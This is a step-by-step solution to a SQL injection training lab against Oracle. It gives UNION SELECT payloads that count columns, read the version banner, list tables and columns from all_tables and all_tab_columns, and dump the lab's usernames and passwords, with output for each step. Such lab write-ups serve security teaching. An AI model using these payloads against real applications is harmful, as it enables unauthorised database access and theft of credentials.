
Lab: SQL injection attack, listing the database contents on Oracle

---

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

---

1/ Determine the number of columns

' UNION SELECT NULL FROM dual--
' UNION SELECT NULL, NULL FROM dual--


2/ Determine the data type of columns

' UNION SELECT 'AAA', 'AAA' FROM dual--


3/ Determine the type and version of the database

' UNION SELECT NULL, banner FROM v$version--
		Oracle Database 11g Express Edition Release 11.2.0.2.0


4/ Determine the table names in the database

' UNION SELECT NULL, table_name FROM all_tables--
		USERS_ZNASIV


5/ Determine the column names in the database

' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS_ZNASIV'--
		USERNAME_ETLMJO
		PASSWORD_PURGYP
		EMAIL


6/ Determine the data

' UNION SELECT USERNAME_ETLMJO, PASSWORD_PURGYP FROM USERS_ZNASIV--
		administrator
		ve2097vp0s7tsgaz1hgs

